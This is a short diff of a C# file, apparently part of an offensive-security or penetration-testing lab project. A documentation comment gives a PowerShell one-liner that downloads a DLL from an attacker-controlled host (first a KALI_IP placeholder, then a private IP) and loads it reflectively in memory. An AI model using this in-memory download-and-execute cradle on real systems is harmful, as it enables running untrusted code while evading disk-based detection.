@@ -15,7 +15,7 @@ public class TestClass
     /// </summary>
     /// <example>
     /// You can run this compiled managed DLL using this powershell one-liner:
-    /// [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://KALI_IP/NetRunnersDll.dll')).GetType('NetRunnersDll.TestClass').GetMethod('TestClass').Invoke(0, $null)
+    /// [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.220/bin/x64/NetRunnersDll.dll')).CreateInstance('NetRunnersDll.TestClass')
     /// </example>
 
     public TestClass()
